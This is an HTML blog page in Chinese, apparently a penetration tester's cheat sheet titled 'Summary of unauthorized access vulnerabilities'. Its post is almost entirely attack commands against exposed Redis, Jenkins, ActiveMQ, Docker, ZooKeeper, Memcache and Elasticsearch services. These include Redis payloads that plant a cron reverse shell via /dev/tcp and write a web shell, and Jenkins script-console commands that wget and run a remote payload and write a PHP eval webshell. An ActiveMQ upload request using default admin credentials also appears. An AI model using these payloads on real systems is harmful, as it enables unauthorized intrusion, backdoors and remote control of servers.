@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="m0sway">
+
+
+
+
+
+<title>未授权访问漏洞总结 | m0sway&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">m0sway&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">m0sway&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">未授权访问漏洞总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">m0sway</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十月 22, 2020&nbsp;&nbsp;10:43:40</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">中间件漏洞利用</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt;redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> flunshall </span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.110</span>:<span class="number">6379</span>&gt;ping </span><br><span class="line"><span class="variable constant_">PONG</span> 存在未授权访问</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">JS</span>打内网</span><br><span class="line"><span class="keyword">var</span> cmd = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">cmd.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://127.0.0.1:6379&quot;</span>);</span><br><span class="line">cmd.<span class="title function_">send</span>(<span class="string">&#x27;flushall\r\n&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cmd =<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">cmd.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://127.0.0.1:6379&quot;</span>);</span><br><span class="line">cmd.<span class="title function_">send</span>(<span class="string">&#x27;eval \&#x27;&#x27;</span> + <span class="string">&#x27;redis.call(\&quot;set\&quot;,\&quot;1\&quot;,\&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/外网IP/5566 0&gt;&amp;1\\n\\n&quot;);redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;,\&quot;/var/spool/cron/\&quot;); redis.call(\&quot;config\&quot;,\&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;root\&quot;);&#x27;</span> + <span class="string">&#x27;\&#x27; 0&#x27;</span> +<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> cmd =<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">cmd.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://127.0.0.1:6379&quot;</span>);</span><br><span class="line">cmd.<span class="title function_">send</span>(<span class="string">&#x27;save\r\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">反弹shell</span><br><span class="line"></span><br><span class="line">写shell</span><br><span class="line"><span class="number">6379</span>&gt; config set dir /<span class="keyword">var</span>/www/html/</span><br><span class="line"><span class="number">6379</span>&gt; config set dbfilename shell.<span class="property">php</span></span><br><span class="line"><span class="number">6379</span>&gt; set x <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"><span class="number">6379</span>&gt; save</span><br><span class="line"></span><br><span class="line"><span class="title class_">Lua</span> <span class="variable constant_">RCE</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/QAX-A-Team/redis_lua_exploit</span></span><br><span class="line">修改redis_lua.<span class="property">py</span>里的 host 为目标 <span class="variable constant_">IP</span></span><br><span class="line">执行返回正常，反弹shell</span><br><span class="line">&gt;<span class="built_in">eval</span> <span class="string">&quot;tonumber(&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1&#x27;, 8)&quot;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.qq.com:8080/manage</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www.qq.com:8080/script</span></span><br><span class="line">执行命令</span><br><span class="line">&gt;println <span class="string">&quot;ifconfig -a&quot;</span>.<span class="title function_">execute</span>().<span class="property">text</span></span><br><span class="line">反弹shell</span><br><span class="line">&gt;println <span class="string">&quot;wget http://your.com/back.py -P /tmp/&quot;</span>.<span class="title function_">execute</span>().<span class="property">text</span></span><br><span class="line">&gt;println <span class="string">&quot;python /tmp/back.py yourIP 8080&quot;</span>.<span class="title function_">execute</span>().<span class="property">text</span></span><br><span class="line">写shell</span><br><span class="line">&gt;println <span class="string">&quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;</span>.<span class="title function_">execute</span>().<span class="property">text</span></span><br><span class="line">&gt;<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/var/www/html/1.php&quot;</span>).<span class="title function_">write</span>(<span class="string">&#x27;&lt;?php @eval($_POST[1]);? &gt;&#x27;</span>);</span><br><span class="line">&gt;def webshell = <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&gt;<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/var/www/html/1.php&quot;</span>).<span class="title function_">write</span>(<span class="string">&quot;$webshell&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h2><p><code>默认端口27017直接连接进行增删改查</code></p>
+<h2 id="ZooKeeper未授权访问"><a href="#ZooKeeper未授权访问" class="headerlink" title="ZooKeeper未授权访问"></a>ZooKeeper未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认端口<span class="number">2181</span></span><br><span class="line">获得服务器环境信息</span><br><span class="line">&gt;echo envi|nc <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span> <span class="number">2181</span></span><br><span class="line">连接</span><br><span class="line">&gt;./zkCli.<span class="property">sh</span> -server <span class="attr">ip</span>:port</span><br></pre></td></tr></table></figure>
+
+<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认端口<span class="number">9200</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.1.1.1:9200/_plugin/head/</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.1.1.1:9200/_nodes</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.1.1.1:9200/_river</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.1.1.1:9200/_plugin/sql/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认端口<span class="number">11211</span></span><br><span class="line">&gt;telnet <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> <span class="number">11211</span></span><br><span class="line">&gt;nc -vv <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> <span class="number">11211</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h2><p><code>默认端口50070</code></p>
+<h2 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">默认端口<span class="number">2375</span></span><br><span class="line">&gt;docker -H <span class="attr">tcp</span>:<span class="comment">//1.1.1.1:2375 images Shipyard</span></span><br><span class="line">默认密码</span><br><span class="line">admin/shipyard</span><br></pre></td></tr></table></figure>
+
+<h2 id="ActiveMQ未授权访问"><a href="#ActiveMQ未授权访问" class="headerlink" title="ActiveMQ未授权访问"></a>ActiveMQ未授权访问</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">默认端口<span class="number">8161</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.1.1.1:8161/admin/connections.jsp</span></span><br><span class="line"><span class="variable constant_">PUT</span> /fileserver/%2F%2F2%<span class="number">083.</span>jsp <span class="variable constant_">HTTP</span>/<span class="number">1.0</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">27</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8161</span></span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Close</span> <span class="title class_">Authorization</span>: <span class="title class_">Basic</span> <span class="title class_">YWRtaW</span>46YWRtaW4= <span class="number">123123123123123123123123123</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>m0sway</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/10/22/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">http://example.com/2020/10/22/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vuln/"># Vuln</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/03/06/Spring%20Boot%20%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">Spring Boot 利用总结</a>
+            
+            
+            <a class="next" rel="next" href="/2020/10/06/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/">弱口令爆破</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© m0sway
+    </div>
+    
+        <!-- 统计 -->
+        <span id="busuanzi_container_site_pv">
+                访问量: <span id="busuanzi_value_site_pv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                访客: <span id="busuanzi_value_site_uv"></span>
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+</body>
+
+</html>
